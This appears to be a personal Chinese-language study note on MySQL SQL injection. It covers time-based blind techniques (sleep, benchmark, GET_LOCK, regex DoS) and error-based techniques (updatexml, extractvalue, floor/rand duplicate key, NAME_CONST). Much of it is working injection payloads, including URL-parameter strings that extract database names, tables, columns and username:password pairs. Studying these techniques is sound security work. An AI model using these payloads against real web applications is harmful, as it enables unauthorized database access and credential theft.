SQL注入学习

时间盲注

sleep()函数

if(判断条件，成功，失败) sleep(5)延迟5s

如果数据库的第一个字母是d，那么会延迟5s响应

SELECT * FROM users WHERE id>0 and if(substr((SELECT `DATABASE`()),1,0)=d,sleep(5),1)   //首字母
SELECT * FROM users WHERE id=1 and if(ascii(substr((SELECT DATABASE()),1,1))=100,sleep(5),1)   //ASCII

benchmark()函数

BENCHMARK(count,expr)
SELECT * FROM users WHERE id=1 and if(ascii(substr((SELECT DATABASE()),1,1))=100,BENCHMARK(10000000,sha(1)),1)

BENCHMARK()函数重复count次执行表达式expr，它可以用于计时MySQL处理表达式有多快。结果值总是0。意欲用于mysql客户，它报告查询的执行时间。

笛卡尔积

SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C

可能是因为这个数据库的原因，加上information_schema.tables C之后的响应时间会特别长

利用and短路运算规则进行时间盲注

GET_LOCK盲注

GET_LOCK有两个参数，一个是key，就是根据这个参数进行加锁的，另一个是等待时间(s)，即获取锁失败后等待多久回滚事务。也就是说需要连接两个会话。

GET_LOCK(key,timeout) ：key 锁的名字，timeout加锁等待时间，时间内未加锁成功则事件回滚。get_lock 加锁成功返回1，

此盲注手法有一些限制，就是必须要同时开两个SESSION进行注入

正则DOSRLIKE注入

正则匹配在匹配较长字符串但自由度比较高的字符串时，会造成比较大的计算量，我们通过rpad或repeat构造长字符串，加以计算量大的pattern，通过控制字符串长度我们可以控制延时。

select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');
SELECT * FROM users WHERE id=1 and if(substr((SELECT DATABASE()),1,1)='d',concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',1);

报错注入

xpath语法错误

mysql5.1之后支持XML语法解析了，经常用的语法有updatexml和extractvalue函数，extractvalue负责在xml文档中按照xpath语法查询节点内容，updatexml则负责修改查询到的内容

updatexml

UpdateXML(xml_target, xpath_expr, new_xml)
xml_target:： 需要操作的xml片段
xpath_expr： 需要更新的xml路径(Xpath格式)
new_xml： 更新后的内容

updatexml最多只能显示32位，需要配合SUBSTR使用。

由于updatexml的第二个参数需要Xpath格式的字符串，以~开头的内容不是xml格式的语法，concat()函数为字符串连接函数显然不符合规则，但是会将括号内的执行结果以错误的形式报出，这样就可以实现报错注入了。

常用paylaod

updatexml(1,concat(0x7e,(select user()),0x7e),1)
updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
通过查询@@version,返回版本。然后CONCAT将其字符串化。因为UPDATEXML第二个参数需要Xpath格式的字符串,所以不符合要求，然后报错。
爆数据库版本信息：
?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
链接用户：
?id=1 and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)
链接数据库：
?id=1 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)
爆库：
?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select schema_name),0x7e) FROM admin limit 0,1),0x7e),1)
爆表：
?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select table_name),0x7e) FROM admin limit 0,1),0x7e),1)
or extractvalue(1, concat(0x7e, (select concat(table_name) from information_schema.tables where table_schema=database() limit 0,1)))
爆字段：
?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select column_name),0x7e) FROM admin limit 0,1),0x7e),1)
or extractvalue(1, concat(0x7e, (select concat(column_name) from information_schema.columns where table_name='users' limit 0,1)))
爆字段内容：
?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)
or extractvalue(1, concat(0x7e, (select concat_ws(':', username, password) from users limit 0,1))) or ''

extractvalue

EXTRACTVALUE (XML_document, XPath_string)：从目标XML中返回包含所查询值的字符串。

XML_document：String格式，为XML文档对象的名称
XPath_string：XPath_string (Xpath格式的字符串)

常用paylaod

and extractvalue(null,concat(0x7e,(select @@datadir),0x7e));

and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));

主键重复

利用到了count()和group by在遇到rand()产生的重复值时报错

floor函数：向下取整的时候

rand() 可以产生一个在0和1之间的随机数。

虽然rand()是产生一个随机数，但是这是伪随机数。就是它产生的值是个稳定的序列

所以floor(rand(0)*2)会固定得到011011的序列

了解一下过程select name,count(*) from users group by name

group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表的数据；如果key不在临时表中，则在临时表中插入key所在行的数据

select count(*) from test group by floor(rand(0)*2)  //结合这个学习原理

查询第一条结果的时候，第一次运行floor(rand(0)*2)，floor(rand(0)*2)的值为0，在临时表中查找，发现并没有该键值，然后再运行一次floor(rand(0)*2)，将结果1写入的临时表。

查询第二条结果的时候，第三次运行floor(rand(0)*2)，在虚拟表中查找结果为1，发现存在，此时直接count(*)的值+1。

查询第三条结果的时候，第四次运行floor(rand(0)*2)，结果为0，在临时表中查找，发现并没有该键值，然后再运行一次floor(rand(0)*2)，将结果1写入的临时表。此时临时表里面已经存在1，所以才会发生主键重复报错。

整个查询过程中，floor(rand(0)*2)被计算了5次，查询原始数据表3次，所以表中需要至少3条数据才能报错。

列明重复

用name_const来制造一个列

select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;
[SQL]select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;
[Err] 1060 - Duplicate column name '5.7.26

ame_const函数要求参数必须是常量，所以实际使用上还没找到什么比较好的利用方式。

利用这个特性加上join函数可以爆列名：

select * from(select * from test a join test b)c;
ERROR 1060 (42S21): Duplicate column name 'id'
select * from(select * from test a join test b using(id))c;
ERROR 1060 (42S21): Duplicate column name 'name'
